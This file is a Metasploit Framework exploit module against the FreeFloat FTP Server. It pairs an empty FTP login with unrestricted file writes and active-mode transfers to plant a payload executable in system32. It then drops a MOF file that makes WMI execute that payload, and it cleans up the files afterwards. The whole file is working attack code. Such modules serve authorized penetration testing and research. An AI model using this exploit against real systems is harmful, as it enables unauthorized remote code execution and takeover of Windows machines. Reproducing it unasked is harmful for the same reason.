##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Ftp
	include Msf::Exploit::Remote::TcpServer
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec
	include Msf::Exploit::FileDropper

	def initialize(info={})
		super(update_info(info,
			'Name'           => "FreeFloat FTP Server Arbitrary File Upload",
			'Description'    => %q{
					This module abuses multiple issues in FreeFloat: 1. No credential is actually
				needed to login; 2. User's default path is in C:\, and this cannot be changed;
				3. User can write to anywhere on the server's file system.  As a result of these
				poor implementations, a malicious user can just log in and then upload files,
				and let WMI (Management Instrumentation service) to execute the payload uploaded.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'sinn3r', # Vulnerability discovery, Metasploit module
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					['URL', 'http://metasploit.com']
				],
			'Platform'       => 'win',
			'Targets'        =>
				[
					['FreeFloat', {}]
				],
			'Privileged'     => true,
			'DisclosureDate' => "Dec 7 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				# Change the default description so this option makes sense
				OptPort.new('SRVPORT', [true, 'The local port to listen on for active mode', 8080])
			], self.class)

		deregister_options('FTPUSER', 'FTPPASS') # Using empty user and password
	end


	def check
		connect
		disconnect

		if banner =~ /FreeFloat/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end


	def on_client_connect(cli)
		peer = "#{cli.peerhost}:#{cli.peerport}"

		case @stage
		when :exe
			print_status("#{peer} - Sending executable (#{@exe.length.to_s} bytes)")
			cli.put(@exe)
			@stage = :mof

		when :mof
			print_status("#{peer} - Sending MOF (#{@mof.length.to_s} bytes)")
			cli.put(@mof)
		end

		cli.close
	end


	def upload(filename)
		select(nil, nil, nil, 1)

		peer = "#{rhost}:#{rport}"
		print_status("#{peer} - Trying to upload #{::File.basename(filename)}")

		conn = connect(false, datastore['VERBOSE'])

		print_status("#{peer} - Sending empty login...")

		res = send_user("", conn)
		if not res or res !~ /331/
			print_error("#{peer} - Error sending username")
			return false
		end

		res = send_pass("", conn)
		if not res or res !~ /230/
			print_error("#{peer} - Error sending password")
			return false
		end

		print_good("#{peer} - Empty authentication was successful")

		# Switch to binary mode
		print_status("#{peer} - Set binary mode")
		send_cmd(['TYPE', 'I'], true, conn)

		# Prepare active mode: Get attacker's IP and source port
		src_ip   = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']
		src_port = datastore['SRVPORT'].to_i

		# Prepare active mode: Convert the IP and port for active mode
		src_ip   = src_ip.gsub(/\./, ',')
		src_port = "#{src_port/256},#{src_port.remainder(256)}"

		# Set to active mode
		print_status("#{peer} - Set active mode \"#{src_ip},#{src_port}\"")
		send_cmd(['PORT', "#{src_ip},#{src_port}"], true, conn)

		# Tell the FTP server to download our file
		send_cmd(['STOR', filename], false, conn)

		disconnect(conn)
	end


	def exploit

		exe_name = "WINDOWS/system32/#{rand_text_alpha(rand(10)+5)}.exe"
		mof_name = "WINDOWS/system32/wbem/mof/#{rand_text_alpha(rand(10)+5)}.mof"
		@mof      = generate_mof(::File.basename(mof_name), ::File.basename(exe_name))
		@exe      = generate_payload_exe
		@stage = :exe

		begin
			t = framework.threads.spawn("reqs", false) {
				# Upload our malicious executable
				u = upload(exe_name)
				# Upload the mof file
				upload(mof_name) if u
				register_file_for_cleanup("#{::File.basename(exe_name)}")
				register_file_for_cleanup("wbem\\mof\\good\\#{::File.basename(mof_name)}")
			}
			super
		ensure
			t.kill
		end
	end

end